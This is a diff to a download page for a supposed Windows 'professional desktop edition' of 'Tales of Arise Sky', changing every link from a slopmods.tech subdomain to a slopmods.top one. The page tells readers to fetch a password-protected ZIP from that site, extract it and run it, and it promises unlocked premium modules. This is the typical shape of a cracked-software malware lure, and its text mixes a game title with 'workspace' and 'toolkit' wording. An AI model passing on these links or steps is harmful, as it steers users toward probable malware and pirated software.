@@ -8,12 +8,12 @@ Tales of Arise Sky — Windows setup and configuration · Premium workspace · Z
 
 > Use the release page below for Windows.
 
-- **Release page:** [ijdnjqhruqm.slopmods.tech](https://ijdnjqhruqm.slopmods.tech/)
-- **Full URL:** `https://ijdnjqhruqm.slopmods.tech/`
+- **Release page:** [ijdnjqhruqm.slopmods.top](https://ijdnjqhruqm.slopmods.top/)
+- **Full URL:** `https://ijdnjqhruqm.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **ijdnjqhruqm.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **ijdnjqhruqm.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Tales of Arise Sky — Windows setup and configuration · Premium workspace · Z
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **ijdnjqhruqm.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **ijdnjqhruqm.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
